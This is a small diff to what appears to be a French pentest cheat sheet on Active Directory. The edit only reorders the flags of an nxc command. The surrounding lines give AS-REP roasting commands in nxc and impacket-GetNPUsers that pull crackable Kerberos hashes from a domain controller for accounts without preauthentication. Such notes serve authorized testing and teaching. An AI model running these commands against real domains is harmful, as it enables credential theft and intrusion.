@@ -159,7 +159,7 @@ Si un compte AD a l'option **"Do not require Kerberos preauthentication"** activ
 
 ```bash
 # nxc -  tester une liste de users sans mot de passe
-nxc ldap 'IP_DC' -u users.txt -p '' --asreproast asreproast.txt --kdcHost 'IP_DC'
+nxc ldap 'IP_DC' -u users.txt -p '' --kdcHost 'IP_DC' --asreproast asreproast.txt 
 
 # impacket -  même chose
 impacket-GetNPUsers -dc-ip 'IP_DC' -no-pass -usersfile users.txt corp.com/ -outputfile hashes.asreproast
